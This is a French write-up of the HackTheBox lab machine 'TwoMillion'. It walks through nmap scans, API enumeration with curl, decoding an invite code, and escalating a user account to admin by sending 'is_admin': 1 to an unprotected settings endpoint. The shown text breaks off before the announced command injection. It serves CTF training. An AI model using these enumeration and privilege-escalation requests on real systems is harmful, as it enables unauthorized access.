# HackTheBox - TwoMillion Write-up 🇫🇷

## Introduction

Bonjour à tous ! 

Voici mon write-up de la box "TwoMillion" sur HackTheBox — une box classée comme facile et qui aborde plusieurs notions intéressantes comme :

- L’énumération d’une API
- L’injection de commande via un endpoint vulnérable
- L’énumération local d'un système
- L’exploitation de deux CVE

Comme d'habitude, tout au long de ce guide, je vais passer en revue les étapes courantes d’un test de pénétration :

- Reconnaissance
- Exploitation
- Post-exploitation

## Informations

- 💻 **Type de machine** : Linux
- **🧠 Compétences principales testées** : Exploitation Web, API, Énumération locale, Élévation de privilèges
- **📦 Outils utilisés** : Nmap, Curl, Netcat, Pwncat, Burpsuite, Firefox

Cette machine est une excellente opportunité pour pratiquer l'énumération (interne/externe) d’une , l'énumération/exploitation d’une API d’un serveur Linux et quelques techniques d'élévation de privilèges.

C’est partie !

---

## Préparation

Tout d'abord, nous pouvons ajouter l'adresse IP cible au fichier `/etc/hosts` pour faciliter l'interaction avec la machine cible.

```bash
echo "10.129.161.99 target" | sudo tee -a /etc/hosts
```

Ou avec nano :

```bash
sudo nano /etc/hosts

10.129.161.99 target # Ajoutez cette ligne
```

Cela nous permet d'accéder à l'adresse IP `10.10.135.61` via le nom suivant : `target`

**Attention : L’adresse IP cible `10.129.161.99` est susceptible de changer durant le write up**

Vérifions notre connexion au VPN de HackTheBox à l’aide d’un simple ping vers la machine cible

```bash
ping -c 4 target
PING target (10.129.161.99) 56(84) bytes of data.
64 bytes from target (10.129.161.99): icmp_seq=1 ttl=63 time=28.4 ms
64 bytes from target (10.129.161.99): icmp_seq=2 ttl=63 time=24.8 ms
64 bytes from target (10.129.161.99): icmp_seq=3 ttl=63 time=25.4 ms
64 bytes from target (10.129.161.99): icmp_seq=4 ttl=63 time=26.3 ms

--- target ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3039ms
rtt min/avg/max/mdev = 24.815/26.229/28.398/1.363 ms
```

Cela nous permet aussi de vérifier que la marchine cible est accessible depuis notre machine attaquante. 

À noter que cette vérification ne fonctionnera pas si la machine cible bloque les requêtes ICMP, dans ce cas il faudra effectuer une autre vérification.

## Énumération

Comme d’habitude on peut commencer notre énumération (active) par effectuer notre scan Nmap en utilisant le template `-A` agressif pour récupérer le plus d’informations possibles lors de notre premier scan.

```bash
nmap -A -oN scan.txt -oX scan.xml target                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 11:16 CEST
Nmap scan report for target (10.129.161.99)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   91.03 ms 10.10.16.1
2   25.49 ms target (10.129.161.99)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.74 seconds
```

Bien, notre scan s’est correctement terminé. D’après ce résultat, nous pouvons relever plusieurs informations :

- **Port 22 :** Le port 22 (SSH) est ouvert, la machine semble aussi utiliser le service OpenSSH en version 8.9p1 → Cela signifie qu’avec des identifiants fonctionnels, nous pourrons nous connecter par SSH à la machine cible.

- **Port 80 :** Le port 80 (HTTP) est également ouvert, la machine semble donc être un serveur web (SSH + HTTP) utilisant le service web Nginx. On peut aussi relever qu’une redirection semble avoir échoué grâce au script NSE `http-title` et le message `Did not follow redirect to http://2million.htb/` sûrement dû à une erreur système.

Pour mettre les choses au clair, nous pouvons utiliser le script que j’ai développé récemment : [Nmap2Table](https://github.com/0xMR007/Nmap2Table.git)

```bash
nmap2table scan.xml table.md       
Starting main script...

Extracting nmap data from /home/mr007/CTFs/HackTheBox/TwoMillion/scan.xml
Generating output to /home/mr007/CTFs/HackTheBox/TwoMillion/table.md
Successfully wrote to file : /home/mr007/CTFs/HackTheBox/TwoMillion/table.md
```

On obtient ainsi le résultat suivant :

### Host : 10.129.161.99 (target)

| Port/Protocol | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 |
| 80/tcp | open | http | nginx |

### NSE Scripts :

```bash
Port 22 :
ssh-hostkey:

  256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

Port 80 :
http-title:
Did not follow redirect to <http://2million.htb/>
```

Ok, donc si on récapitule jusqu’ici : la machine cible semble être un serveur web Nginx avec la possibilité de s’y connecter par SSH (comme tout serveur en général). Nous avons aussi un problème de redirection web que nous résoudrons en suivant.

Avant d’aller plus loin dans notre énumération nous devons nous assurer de n’avoir manqué aucun autre port. Nous pouvons faire cela à l’aide de la commande suivante.

```bash
nmap -sS -p- --min-rate=1500 target                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 11:17 CEST
Nmap scan report for target (10.129.161.99)
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
```

Parfait les seuls ports ouverts semblent bien être respectivement : 22, 80. Continuons.

## Q1 - Ports TCP

**Rappel de la question :** *Combien de ports TCP sont ouverts ?*

D’après nos précédents résultat, nous avons trouvé 2 ports TCP.

Réponse : `2`

Pour résoudre le problème de redirection nous pouvons simplement ajouter la ligne suivante à notre fichier `hosts`

```bash
sudo nano /etc/hosts

10.129.161.99 target 2million.htb  # Ajoutez cette ligne
```

**Note : Le fichier `/etc/hosts` (ou `C:\Windows\System32\drivers\etc\hosts` sous Windows) agit comme DNS local. Il permet de faire correspondre une adresse IP à un nom de domaine.**

Vous l’aurez compris, en ajoutant cette ligne nous pourrons accéder correctement à l’application web hébergé par la machine cible via le nom de domaine `2million.htb`.

Effectuons à nouveau notre scan initial

```bash
nmap -A -oN scan.txt -oX scan.xml 2million.htb      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 11:25 CEST
Nmap scan report for 2million.htb (10.129.161.99)
Host is up (0.058s latency).
rDNS record for 10.129.161.99: target
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   91.23 ms 10.10.16.1
2   24.32 ms target (10.129.161.99)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds
```

Parfait ! Le problème de résolution DNS semble être résolut.

Nous avons désormais accès à l’application web hébergé par la machine cible.

Essayons de s’y rendre via un navigateur web  !

![image.png](attachment:2457e615-077c-4597-8cdc-0440e373317b:image.png)

Après s’être rendu sur `2million.htb` nous obtenons une page d’accueil de HTB.

Si l’on se rend sur la page `/invite` et que nous analysons cela de plus près en utilisant l’onglet *Réseau* du Devtools Firefox (`F12`) nous pouvons remarquer quelque chose.

![image.png](attachment:ce1d42f4-8d3d-4245-a1f1-724b80ac18bf:image.png)

Dans les requêtes effectuées, un fichier Javascript `inviteapi.min.js` est présent.

## Q2 - Fichier Javascript

**Rappel de la question :** *Quel est le nom du fichier Javascript chargé par la page `/invite` qui ai un rapport avec les codes d’invitations ?*

D’après la question 2, nous devons chercher un fichier Javascript qui est chargé sur la page `/invite` qui ai un rapport avec les codes d’invitations.

D’après le nom du fichier `inviteapi.min.js` nous pouvons simplement répondre `inviteapi.min.js`.

## Q3 - Fonction Javascript

**Rappel de la question :** *Quelle fonction JavaScript sur la page d'invitation renvoie le premier indice pour obtenir un code d'invitation ?*

Pour trouver le nom de cette fonction, nous pouvons nous servir du Debbuger de Firefox.

En cherchant le terme “code”, on obtient dans un premier temps une fonction `verifyInviteCode` puis juste en dessous une autre fonction particulièrement intéressant nommée `makeInviteCode` ayant un rapport avec l’obtention d’un code d’invitation.

![image.png](attachment:b80be9a9-6ec2-43ab-bb07-e566650bd232:cbc65a8b-7331-437a-9141-2da3ae084002.png)

**Réponse :** `makeInviteCode`

## Q4 - Encodage

**Rappel de la question :**  *L’endpoint dans makeInviteCode renvoie des données chiffrées. Ce message fournit un autre endpoint à interroger. Cet endpoint renvoie une valeur `code` avec un format de conversion binaire-texte très courant. Quel est le nom de cet encodage ?*

D’après la fonction Javascript précédente, on remarque un endpoint assez intéressant : `/api/v1/invite/how/to/generate`

Il s’agit d’un endpoint API ! Effectuons une requête HTTP en POST dessus afin de voir ce qu’il s’y passe.

```bash
curl -v -X POST -d {} http://2million.htb/api/v1/invite/how/to/generate      
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.161.99
*   Trying 10.129.161.99:80...
* Connected to 2million.htb (10.129.161.99) port 80
* using HTTP/1.x
> POST /api/v1/invite/how/to/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 2
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 2 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 09 Aug 2025 09:55:52 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=25fb2hvggap1q3i2b2lri5gmqb; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%
```

Bien, d’après le résultat de la commande **curl**, on obtient une réponse très intéressante : 

`{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%`

Cette réponse, au format JSON (format souvent utilisé pour les APIs), contient une valeur pour la clé `data` qui semble être chiffrée par un chiffrement Caesar (`ROT13`).

On peut essayer de le déchiffre via Cyberchef (https://gchq.github.io/CyberChef/) 

![image.png](attachment:561e86ee-9276-4159-aeab-74156c249423:image.png)

Parfait nous avons réussis à déchiffrer le message reçu !

D’après celui ci, nous devons effectuer une autre requête POST vers l’endpoint `/api/v1/invite/generate`

Essayons cela !

```bash
curl -v -X POST -d {} http://2million.htb/api/v1/invite/generate     
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.161.99
*   Trying 10.129.161.99:80...
* Connected to 2million.htb (10.129.161.99) port 80
* using HTTP/1.x
> POST /api/v1/invite/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 2
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 2 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 09 Aug 2025 10:02:43 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=15glilrogk7npdh9a5v0u6d9f8; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"0":200,"success":1,"data":{"code":"MkJEQVQtS0VNNVgtMEdDTFAtSDlaMlU=","format":"encoded"}}%
```

Ok, cette fois nous recevons un code qui semble être encodé en base64.

Décodons le sur Cyberchef à nouveau.

![image.png](attachment:92d9429c-8446-4c16-89fa-3b6afe7957ae:image.png)

Ou en ligne de commandes

```bash
echo 'MkJEQVQtS0VNNVgtMEdDTFAtSDlaMlU=' | base64 -d                               
2BDAT-KEM5X-0GCLP-H9Z2U
```

Le résultat semble correspondre à un code d’invitation, en entrant `base64` comme réponse à la question celle ci est validée. Il s’agit donc du bon encodage !

**Réponse :** `base64` 

## Q5 - Connexion pack

**Rappel de la question :**  *Quel est le chemin vers l’endpoint que la page utilise lorsqu'un utilisateur clique sur « Pack de connexion » ?*

Maintenant que nous avons un code d’invitation nous pouvons l’entrer dans la page `/invite` puis créer un compte.

![image.png](attachment:76e79c66-dfcf-49c2-857e-a0b05f453d70:image.png)

Parfait, après s’être connecter à notre nouveau compte nous obtenons un dashboard avec plusieurs onglets latéraux (Dashboard, Rules, Change Log, etc…).

En regardant un peu partout, je me suis rendu sur la page `/access` via l’onglet ***Access***.

J’ai alors trouvé le fameux bouton “Connection pack” et l’ai inspecté via le Devtools de Firefox.

![image.png](attachment:b92ed197-e969-46fd-932e-00bccbf4bcb5:image.png)

D’après la capture d’écran ci-dessus, le bouton semble pointer vers l’endpoint `/api/v1/user/vpn/generate` ce qui répond alors à notre question.

**Réponse :** `/api/v1/user/vpn/generate`

## Q6 - Nombre d’endpoints d’API

**Rappel de la question :**  *Combien d’endpoints API existe-t-il sous /api/v1/admin ?*

Pour cette question j’ai mis un peu de temps à savoir comment j’allais m’y prendre. J’ai d’abord essayé du fuzzing mais j’ai vite compris que ce n’était pas la bonne solution.

En effectuant une simple requête (GET par défaut) avec **curl** sur le `/api` j’ai d’abord obtenu une erreur 401 (Unauthorized).

```bash
curl -v http://2million.htb/api                                                      
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Sun, 10 Aug 2025 14:50:05 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=l09qjmu1dlkss4u8m5j7u9umrk; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

J’ai alors récupéré mon cookie de session ci dessous et l’ai passé dans une nouvelle requête.

![image.png](attachment:f22e95c0-3cea-48f2-98d1-21d321e96c41:image.png)

```bash
curl -v http://2million.htb/api --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314"     
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 14:51:23 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"\/api\/v1":"Version 1 of the API"}
```

J’ai alors obtenu une réponse satisfaisante (enfin) : `{"\/api\/v1":"Version 1 of the API"}`.

J’ai alors continué progressivement sur jusqu’à l’endpoint qui nous intéresse `/admin` en gardant mon cookie de session.

```bash
curl -v http://2million.htb/api/v1 --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314"
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 14:51:58 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

J’ai aussi découvert que l’on pouvait obtenir une sortie plus esthétique en pipant (`|`) la réponse curl vers la commande `jq`. On obtient alors :

```bash
curl http://2million.htb/api/v1 --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   800    0   800    0     0   4338      0 --:--:-- --:--:-- --:--:--  4347
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Nous pouvons désormais répondre à la question :

**Réponse : `3`**

## Q7 - Endpoint permettant de changer un compte utilisateur en compte admin

**Rappel de la question :** *Quel endpoint d'API permet de changer un compte utilisateur en compte administrateur ?*

D’après le résultat précédent, nous avons obtenu une vue plus large de la structure de l’API.

L’endpoint qui correspondrait le plus à cette question serait `/api/v1/admin/settings/update` notamment par sa description `"Update user settings"` ou `"Mettre à jour les paramètres utilisateur"`

**Réponse :** `/api/v1/admin/settings/update`

## Q8 - Injection de commande

**Rappel de la question :** *Quel endpoint d’API présente une vulnérabilité d’injection de commande ?*

Bien, nous devons donc trouver un endpoint vulnérable à l’injection de commandes.

Effectuons une requête vers `/api/v1/admin/auth` afin de vérifier nos privilèges actuels

```bash
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    17    0    17    0     0     93      0 --:--:-- --:--:-- --:--:--    93
{
  "message": false
}
```

Apparemment nous n’avons pas de privilèges administrateur.

Nous pourrions essayer de nous les donner via l’endpoint `/api/v1/admin/settings/update` pas vrai ? 

Essayons de faire ça avec une requête de test avec un corps de données vide

```bash
curl -v -X PUT -d {} -H "Content-Type: application/json" http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> Content-Length: 2
> 
} [2 bytes data]
* upload completely sent off: 2 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:16:29 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [67 bytes data]
100    58    0    56  100     2    311     11 --:--:-- --:--:-- --:--:--   324
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Intéressant, il semble nous manquer un paramètre email dans les données envoyées précédemment.

Ajoutons le mail que nous avons utilisé lors de notre inscription dans le corps de données.

```bash
curl -v -X PUT -d '{"email": "mr007@mail.com"}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> Content-Length: 27
> 
} [27 bytes data]
* upload completely sent off: 27 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:17:50 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [70 bytes data]
100    86    0    59  100    27    322    147 --:--:-- --:--:-- --:--:--   472
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Il semble nous manquer un autre paramètre `is_admin`, en tout cas le paramètre email semble avoir été reconnu.

Ajoutons le paramètre `is_admin` dans le corps de données avec une valeur à “false” pour tester.

```bash
curl -v -X PUT -d '{"email": "mr007@mail.com", "is_admin": "false"}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> Content-Length: 48
> 
} [48 bytes data]
* upload completely sent off: 48 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:18:42 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [87 bytes data]
100   124    0    76  100    48    408    258 --:--:-- --:--:-- --:--:--   670
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Ok donc le paramètre ne prend pas un booléen mais une valeur binaire (ce qui revient au même finalement). Mettons cette valeur à 1 afin de nous donner les privilèges administrateur.

```bash
curl -v -X PUT -d '{"email": "mr007@mail.com", "is_admin": 1}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> Content-Length: 42
> 
} [42 bytes data]
* upload completely sent off: 42 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:19:00 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [54 bytes data]
100    85    0    43  100    42    231    226 --:--:-- --:--:-- --:--:--   459
* Connection #0 to host 2million.htb left intact
{
  "id": 13,
  "username": "0xMR007",
  "is_admin": 1
}
```

Parfait, le serveur nous renvoi notre compte utilisateur ainsi que ses caractéristiques.

Cela semble avoir fonctionner, vérifions à nouveau nos privilèges.

```bash
curl -v http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314"
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> GET /api/v1/admin/auth HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:21:15 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"message":true}
```

Parfait ! Nous avons réussi à mettre à jour notre compte utilisateur vers un compte admin.

Essayons maintenant générer notre fichier VPN pour vérifier que nos privilèges admin fonctionnent

```bash
curl -v -X POST -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" | jq                                                                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:22:24 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [70 bytes data]
100    59    0    59    0     0    327      0 --:--:-- --:--:-- --:--:--   325
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

Le nom d’utilisateur semble être requis. Ajoutons-le dans le corps de données.

```bash
